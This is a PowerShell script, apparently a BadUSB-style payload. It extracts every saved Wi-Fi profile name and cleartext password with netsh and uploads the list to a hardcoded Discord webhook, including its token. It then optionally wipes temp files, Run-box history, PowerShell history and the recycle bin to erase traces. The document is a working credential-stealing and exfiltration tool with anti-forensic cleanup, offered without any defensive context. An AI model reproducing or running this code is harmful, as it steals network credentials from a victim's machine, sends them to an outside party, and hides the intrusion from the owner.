$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

$wifiProfiles > $env:TEMP/--wifi-pass.txt

# Function to upload to Discord via Webhook
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $webhookUrl = "https://discord.com/api/webhooks/1033424331855896606/zEgLOsmzgLZ9iLazQ_Jc4zhcpVGIpiPe0smW5QFUyHK8waleDHt8OP8S_k24AD_GgTeW"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        $fileContent = Get-Content -Path $file -Raw
        $fileBody = @{
            'content' = $fileContent
            'username' = $env:username
        }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($fileBody | ConvertTo-Json) -Headers @{ 'Content-Type' = 'multipart/form-data' }
    }
}

# Upload to Discord using the function
Upload-Discord -file "$env:TEMP/--wifi-pass.txt"

# Function to clean up sensitive information
function Clean-Exfil { 
    # empty temp folder
    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

    # delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Clean up sensitive information if specified
if (-not ([string]::IsNullOrEmpty($ce))){
    Clean-Exfil
}

# Remove the temporary file
Remove-Item $env:TEMP/--wifi-pass.txt
